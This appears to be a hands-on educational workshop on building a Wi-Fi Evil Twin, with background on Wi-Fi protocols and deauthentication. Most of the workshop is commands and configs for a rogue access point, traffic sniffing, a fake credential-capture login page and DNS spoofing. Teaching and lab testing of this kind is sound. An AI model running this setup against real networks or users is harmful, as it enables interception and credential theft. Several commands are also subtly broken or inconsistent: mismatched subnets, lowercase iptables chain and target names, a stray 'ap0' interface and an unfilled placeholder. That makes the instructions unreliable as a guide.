# Warning
This workshop is for educational purposes only.
Ethical hacking is conducted with the explicit permission of the system owner to improve security. Unauthorized access to networks is illegal and strictly prohibited.

# Table of Contents

- [Warning](#warning)
- [Table of Contents](#table-of-contents)
- [Introduction](#introduction)
  - [About Wi-Fi Security](#about-wi-fi-security)
    - [Wi-Fi Security Protocols](#wi-fi-security-protocols)
    - [WEP (Wired Equivalent Privacy)](#wep-wired-equivalent-privacy)
    - [WPA (Wi-Fi Protected Access)](#wpa-wi-fi-protected-access)
    - [WPA2](#wpa2)
    - [WPA3](#wpa3)
  - [Wireless Attack Vectors: Forcing the Connection](#wireless-attack-vectors-forcing-the-connection)
    - [Deauthentication (Deauth) Attack](#deauthentication-deauth-attack)
    - [Wi-Fi Flooding](#wi-fi-flooding)
  - [How an evil twin works](#how-an-evil-twin-works)
    - [Steps of Evil Twin Functionality:](#steps-of-evil-twin-functionality)
    - [Key Elements Involved:](#key-elements-involved)
  - [Use Cases:](#use-cases)
- [Workshop](#workshop)
  - [Create your Access Point](#create-your-access-point)
  - [Routing to Internet](#routing-to-internet)
  - [Monitoring Traffic](#monitoring-traffic)
  - [DNS Spoofing](#dns-spoofing)
  - [In case of problems](#in-case-of-problems)
    - [Single Wi-Fi Interface \& Hardware Limits](#single-wi-fi-interface--hardware-limits)
    - [Service Conflicts (NetworkManager \& Port 53)](#service-conflicts-networkmanager--port-53)
    - [Quick Debug Check](#quick-debug-check)

# Introduction

An **Evil Twin** is a rogue Wi-Fi access point (AP) configured to masquerade as a legitimate network. By mimicking a trusted SSID, it facilitates a **Man-in-the-Middle (MitM)** attack specifically designed for wireless environments. Once a victim is tricked into connecting to the fake AP, the attacker gains the ability to intercept, inspect, modify, or drop the victim's network traffic in real-time.

## About Wi-Fi Security

### Wi-Fi Security Protocols

To mitigate the risks of wireless eavesdropping, the [Wi-Fi Alliance](https://www.wi-fi.org/) developed the **WPA (Wi-Fi Protected Access)** family of protocols. Over the decades, security standards have evolved from the now-obsolete **WEP** to the modern **WPA3**. 

Before diving into the attack vectors, we must first identify the security landscape of the surrounding networks. You can audit nearby access points using the following command:

```bash
# On Linux (requires wireless-tools)
sudo iwlist scan | grep -iE 'ESSID|Encryption|IE:'
```

Since Wi-Fi broadcasts data over the air, encryption and authentication are vital. Without these features, networks are highly susceptible to data leaks, credential theft, and malware injection. Below, we explore the evolution of these protocols.

### WEP (Wired Equivalent Privacy)

Introduced in 1997, **WEP** is the oldest and most vulnerable standard. It is now considered **deprecated** and highly insecure. 

*   **Encryption:** WEP uses a 64-bit or 128-bit static key (RC4 stream cipher).
*   **The Flaw:** Because the key is static and the Initialization Vectors (IVs) are short (24-bit), they eventually repeat on busy networks. An attacker can capture these packets and use statistical analysis to crack the key in minutes.
*   **Current Status:** While you may still encounter WEP in the wild due (mainly) to administrative misconfiguration, it offers almost no protection against modern exploits.

### WPA (Wi-Fi Protected Access)
Developed as a temporary response to the fundamental flaws in WEP, WPA was designed to be compatible with older hardware via a firmware update.
*   **Encryption:** It introduced **TKIP** (Temporal Key Integrity Protocol), which dynamically changed keys for each packet, making the statistical attacks used against WEP much harder.
*   **The Flaw:** TKIP was eventually found to have its own weaknesses, and the protocol still relied on parts of the insecure RC4 cipher. It is now considered legacy and insecure.

### WPA2
Introduced in 2004, WPA2 became the industry standard for over a decade. It is significantly more robust than its predecessors.
*   **Encryption:** It replaced the weak RC4/TKIP system with **AES** (Advanced Encryption Standard) and **CCMP**.
*   **The Flaw:** While the encryption is strong, WPA2 is vulnerable to **Handshake Cracking**. Since the "4-Way Handshake" used to connect a device is broadcast over the air, an attacker can capture it and attempt an offline dictionary attack to guess the Pre-Shared Key (password). It is also susceptible to the **KRACK** (Key Reinstallation Attack) vulnerability.



### WPA3
Released in 2018, WPA3 is the most modern and secure protocol, designed to address the inherent weaknesses of WPA2.
*   **Encryption:** It uses **SAE** (Simultaneous Authentication of Equals), which replaces the vulnerable PSK exchange.
*   **The Advantage:** WPA3 provides **Forward Secrecy**, meaning that even if an attacker discovers the network password in the future, they cannot decrypt data that was captured in the past. It also protects against "brute-force" dictionary attacks by locking out attackers after too many failed attempts.


## Wireless Attack Vectors: Forcing the Connection

To successfully deploy an **Evil Twin**, an attacker often needs to force users off their legitimate network so they reconnect to the rogue one. This is achieved through specific Denial of Service (DoS) techniques.

### Deauthentication (Deauth) Attack
A **Deauthentication attack** targets the 802.11 management frames. In many Wi-Fi implementations (especially before WPA3), these frames are unencrypted and unauthenticated.
*   **How it works:** An attacker spoofs the MAC address of the legitimate Access Point and sends a "deauth" command to the victim's device. 
*   **The Result:** The device thinks the router is asking it to disconnect. Once disconnected, the device will automatically search for the strongest known SSID. If the **Evil Twin** is physically closer or has a stronger signal, the device connects to it automatically.



### Wi-Fi Flooding
Flooding is used to create chaos or saturate the wireless spectrum to prevent legitimate communication.
*   **Beacon Flooding:** The attacker broadcasts thousands of "Beacon Frames" with different SSIDs. This can cause the Wi-Fi menu on a victim's phone or laptop to freeze or display hundreds of fake networks, making it impossible to distinguish the real one.
*   **Authentication Flooding:** The attacker sends a massive volume of fake authentication requests to a specific AP. This overwhelms the router's CPU and memory, causing it to crash or stop accepting new, legitimate clients.

By combining a **Deauth attack** to kick the user and an **Evil Twin** to catch them, an attacker creates a seamless bridge to intercept the victim's private data.








## How an evil twin works

The core concept is to mimic a legitimate network's SSID (Service Set Identifier) and sometimes its MAC address. Devices often automatically connect to known SSIDs, especially open networks, or switch to an AP with a stronger signal.

### Steps of Evil Twin Functionality:
1. **Reconnaissance:** The attacker scans the environment to identify the target network, its SSID, and the hardware channel it operates on.
2. **Access Point Creation:** The attacker sets up a rogue AP broadcasting the exact same SSID as the target. To make it more appealing, they usually boost their signal strength.
3. **Deauthentication (Optional but common):** The attacker sends spoofed deauthentication frames to the clients connected to the legitimate AP. When the clients disconnect and try to reconnect, they automatically join the attacker's "Evil Twin" because of its stronger signal.
4. **Interception:** Once connected, all the victim's traffic flows through the attacker's machine, allowing for packet sniffing, DNS spoofing, and credential harvesting.

### Key Elements Involved:
* A wireless network adapter capable of entering **Monitor Mode** (to inject deauth packets) and **Master/AP Mode** (to broadcast the network).
* Software to broadcast the AP (e.g., `hostapd`).
* Software to assign IP addresses and route DNS requests (e.g., `dnsmasq`).
* Network Address Translation (NAT) to forward the victim's traffic to the real internet, keeping them unaware of the interception.

## Use Cases:
* **Malicious:** Stealing login credentials, session hijacking, delivering malware, or capturing sensitive financial data.
* **Educational / Ethical:** Red team engagements to test a company's wireless security posture, demonstrating the risks of public Wi-Fi to employees, and validating network segregation.


# Workshop

In this hands-on workshop, you will build an Evil Twin attack from scratch. You will need a Linux environment and a Wi-Fi adapter. Let's assume your internet-facing interface is `eth0` and your wireless interface is `wlan0`.

## Create your Access Point

First, we need to set up the wireless interface to act as an Access Point. If you only have one wireless card, we can try to create a virtual interface so you can still use the physical one for other tasks (if your hardware supports it).

**1. Check your wireless interfaces:**
```bash
iwconfig
# or
ip a
```

**2. Create a virtual interface (Optional):**
If you want to create a virtual AP interface named `wlan0_ap` linked to your physical `wlan0`:
```bash
sudo iw dev wlan0 interface add wlan0_ap type __ap
```

**3. Configure `hostapd`:**
`hostapd` is a user-space daemon used for wireless access points and authentication servers. Create a configuration file named `hostapd.conf`:

```conf
# hostapd.conf
interface=wlan0_ap
driver=nl80211
ssid=Free_Public_WiFi
hw_mode=g
channel=6
auth_algs=1
ignore_broadcast_ssid=0
```

**4. Start the Access Point:**
```bash
sudo hostapd ./hostapd.conf
```
*Leave this running in a terminal. You should now see "Free_Public_WiFi" broadcasting from your phone or another device.*

## Routing to Internet

Right now, devices can connect to your AP, but they won't get an IP address and cannot browse the internet. We need to set up a DHCP server and route their traffic.

**1. Assign an IP to your AP interface:**
Open a new terminal and give your access point a gateway IP address.
```bash
sudo ifconfig wlan0_ap 192.168.1.1 netmask 255.255.255.0 up
```

**2. Configure `dnsmasq`:**
`dnsmasq` will handle assigning IP addresses to victims (DHCP) and resolving their DNS requests. Create `dnsmasq.conf`:

```conf
# dnsmasq.conf
interface=wlan0_ap
dhcp-range=192.168.50.10,192.168.50.100,12h
dhcp-option=3,192.168.50.1 # Default Gateway
dhcp-option=6,8.8.8.8 # DNS Server
```

Start the service:
```bash
sudo dnsmasq -C ./dnsmasq.conf -d
```

**3. Set up NAT (Network Address Translation):**
To forward the traffic from your fake AP (`wlan0_ap`) out to the real internet (`eth0`), you need to enable IP forwarding and configure `iptables`.

```bash
# Enable IP Forwarding in the kernel
echo 1 > /proc/sys/net/ipv4/ip_forward

# Flush old rules (optional, be careful if you have a custom firewall)
sudo iptables -F
sudo iptables -t nat -F

# Set up IP Masquerading
iptables -t nat -A postrouting -s 192.168.50.0/24 -o $interface_internet$ -j masquerade 
iptables -A FORWARD -i ap0 -o $interface_internet$ -j ACCEPT
iptables -A FORWARD -i $interface_internet$ -o ap0 -m state --state RELATED,ESTABLISHED -j ACCEPT
```
*Your connected devices should now have full internet access.*

## Monitoring Traffic

Because all victim traffic is now routing through your machine, you can passively monitor it.

**1. Using `tcpdump`:**
We will monitor ports `80` (HTTP) and `443` (HTTPS) to see the web traffic passing through our Evil Twin.

```bash
sudo tcpdump -i wlan0_ap port 80 or port 443 -n -v
```

**2. Create an HTTP test page:**
Because HTTPS traffic is encrypted, you won't be able to read the contents or passwords natively. To demonstrate how dangerous unencrypted traffic is, let's host a quick HTTP page.

Create a file called `index.html`:
```html
<html>
<body>
  <h1>Welcome to the Network</h1>
  <form action="" method="POST">
    Username: <input type="text" name="user"><br>
    Password: <input type="password" name="pass"><br>
    <input type="submit" value="Login">
  </form>
</body>
</html>
```

Serve it quickly using Python on port 80:
```bash
sudo python3 -m http.server 80
```
*Connect a device to your AP, navigate to `http://192.168.1.1`, submit some credentials, and watch them appear in cleartext via your network sniffer!*

You can also use Apache2.

## DNS Spoofing

The ultimate goal of an Evil Twin is often to redirect a user to a fake captive portal or a cloned login page. We can do this by lying about DNS records.



**1. Configure Spoofing in `dnsmasq`:**
Stop your running `dnsmasq` process. Edit your `dnsmasq.conf` to redirect a target domain (e.g., `example.com`) to your attacker IP (`192.168.1.1` where your Python server is running).

Add this line to `dnsmasq.conf`:
```conf
address=/example.com/192.168.1.1
```
Restart `dnsmasq`.

**2. The Browser vs. Dig Challenge:**
If you run `dig example.com` from a connected victim machine, you will likely see the response successfully return `192.168.1.1`. However, if you type `example.com` into a web browser, it might fail or load the real website.

**Why does this happen and how do we fix it?**

* **DNS Caching:** Operating systems and web browsers aggressively cache DNS results to speed up browsing.
    * *Solution:* Flush the OS DNS cache (e.g., `ipconfig /flushdns` on Windows), clear the browser cache, or open a fresh "Incognito/Private" window.
* **HSTS (HTTP Strict Transport Security):** If you try to spoof a major website like `facebook.com` or `google.com`, modern browsers know these sites *must* use HTTPS. Because your fake server does not have a valid TLS/SSL certificate signed by a trusted Authority for "facebook.com", the browser will show a hard warning and block the connection.
    * *Solution for the Workshop:* To successfully demonstrate the redirection, test it on a site that does not use HSTS or HTTPS, such as `http://neverssl.com`, or create a fictitious domain that doesn't exist on the real internet to see your fake login page appear.
* **DNS over HTTPS (DoH):** Modern browsers (like Chrome or Firefox) often bypass the local network's DNS server entirely and send encrypted DNS requests directly to Google or Cloudflare.
    * *Solution:* Turn off "Secure DNS" in the browser settings of your test victim machine.

## In case of problems

During the setup of your Evil Portal, you might encounter technical hurdles related to your hardware or background services. Here is how to handle the most common issues.

### Single Wi-Fi Interface & Hardware Limits
If you only have one Wi-Fi card, creating a stable "Virtual Interface" (VIF) to stay connected to a source while broadcasting a fake AP is often difficult.

**The Workaround:**
If your virtual interface fails, use your smartphone to provide the "source" internet:
1. Connect your phone to your laptop via **USB**.
2. Enable **USB Tethering** in your phone's settings.
3. Your computer will treat this as a wired connection (usually named `usb0`).
4. You can now use your physical Wi-Fi card (`wlan0`) exclusively for **hostapd** without any interference.



---

### Service Conflicts (NetworkManager & Port 53)
Standard Linux distributions run background services that fight for control over your Wi-Fi card or the DNS ports.

**1. Stopping Network Manager:**
Network Manager often tries to "reclaim" the Wi-Fi card while `hostapd` is running. You may need to stop it entirely:
```bash
sudo systemctl stop NetworkManager
```

> **WARNING:** Disabling Network Manager will disconnect you from your current Wi-Fi network. Ensure you have an alternative internet source (like USB tethering) before running this command.

**2. Freeing Port 53 (DNS):**
If `dnsmasq` fails to start with an "Address already in use" error, it is because `systemd-resolved` is already occupying port 53.
```bash
sudo systemctl stop systemd-resolved
sudo systemctl disable systemd-resolved
```

**3. Cleaning up "Ghost" Processes:**
If things get messy, kill any remaining instances of the tools before trying again:
```bash
sudo killall hostapd dnsmasq
```



---

### Quick Debug Check
Before launching your tools, always check what is currently using the network ports to avoid silent failures:
* **Check Port 53:** `sudo lsof -i :53` (Must be empty for `dnsmasq`)
* **Check Port 80:** `sudo lsof -i :80` (Should be your Apache/Nginx server)

By following these steps, you ensure a "clean" environment for your Evil Twin demonstration.
